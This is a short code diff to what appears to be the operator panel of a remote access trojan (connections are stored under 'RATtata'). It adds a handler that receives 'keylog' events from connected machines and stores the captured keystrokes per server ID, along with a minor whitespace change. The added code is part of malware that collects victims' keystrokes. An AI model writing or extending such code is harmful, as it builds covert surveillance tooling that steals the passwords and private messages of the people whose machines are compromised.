@@ -123,6 +123,13 @@ export default {
         });
       });
 
+      client.on("keylog", keylogData => {
+        this.$store.dispatch("addKeylog", {
+          serverID: client.__serverID,
+          data: keylogData
+        });
+      });
+
       client.on("serverID", id => {
         client.__serverID = id;
 
@@ -130,7 +137,7 @@ export default {
           console.log("ALREADY OPEN");
           return;
         }
-        
+
         window.RATtata.connections[id] = {
           client
         };
